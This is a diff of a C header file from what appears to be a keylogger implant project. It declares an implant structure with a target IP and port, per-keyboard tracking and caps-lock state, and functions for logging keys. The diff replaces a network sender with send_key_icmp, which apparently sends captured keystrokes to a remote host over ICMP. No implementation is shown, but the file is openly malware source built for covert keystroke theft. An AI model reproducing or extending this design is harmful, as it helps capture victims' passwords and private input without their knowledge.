@@ -27,11 +27,6 @@ struct keyboard_s {
     devices;
 };
 
-typedef struct translated_key {
-    char const *description;
-    char const representation;
-} translated_key_t;
-
 /*
     contains project settings, such as target
     port & IP address, whether debug mode is enabled
@@ -44,10 +39,11 @@ typedef struct implant_s {
     char ip[STRING_BUFFER_SIZE];
     int disable_net;
 
-    /* keyboard settings */
+    /* keyboard settings (multiple if using dock or something) */
     TAILQ_HEAD(listhead, keyboard_s)
     kbd;
 
+    uint8_t using_caps_lock;
 } implant_t;
 
 #define SUCCESSFUL 1
@@ -70,14 +66,13 @@ typedef struct implant_s {
 #define KEY_RELEASED 0
 
 // net.c
-int init_remote_connection(implant_t *);
-int send_key_description(int, char[STRING_BUFFER_SIZE]);
+int send_key_icmp(implant_t *, struct input_event);
 
 // opt.c
 int parse_user_input(int, char **, implant_t *);
 
 // logger.c
-void keylog(implant_t *, int);
+void keylog(implant_t *);
 
 // keyboard.c
 void fetch_available_keyboards(implant_t *);
